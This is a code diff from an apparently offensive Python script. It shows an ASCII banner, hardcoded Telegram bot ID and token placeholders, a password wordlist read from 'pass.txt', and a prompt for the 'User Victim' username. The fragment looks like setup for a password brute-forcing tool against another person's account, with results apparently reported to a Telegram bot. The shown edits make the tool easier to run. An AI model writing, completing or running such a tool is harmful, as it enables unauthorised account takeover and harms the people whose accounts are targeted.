@@ -120,23 +120,24 @@ logo =(f'''{Z}
  "*$$$"            ^$$P
     ""              ^"
 	''')         
+# Print the logo
 print(logo)
 print(f'{a36}════════════════════════════════')
-ID = input(f'{a22}Enter ID  {a20}➤ : {Z}')
-os.system('clear')
-print (logo)
-print(f'{a36}════════════════════════════════')
-token = input(f'{a26}Enter Token  {a20}➤  : {Z}')
-os.system('clear')
-print(logo)
-print(f'{a36}════════════════════════════════')
+
+# Hardcode the Telegram ID and Token
+ID = 'your_telegram_id_here'  # Replace with your actual Telegram ID
+token = 'your_telegram_bot_token_here'  # Replace with your Telegram Bot Token
+
+# Create a session for requests
 r = requests.Session()
 
-file = ('pass.txt')
+# Open the password file
+file = 'pass.txt'
 rfile = open(file, 'r')
 os.system('clear')
 print(logo)
-print(f'{a36}════════════════════════════════')
+
+# Get the victim's username
 us = input(f'{a22}Enter  User Victim  {a20}➤  : {Z} ')
 os.system('clear')
 print(logo)
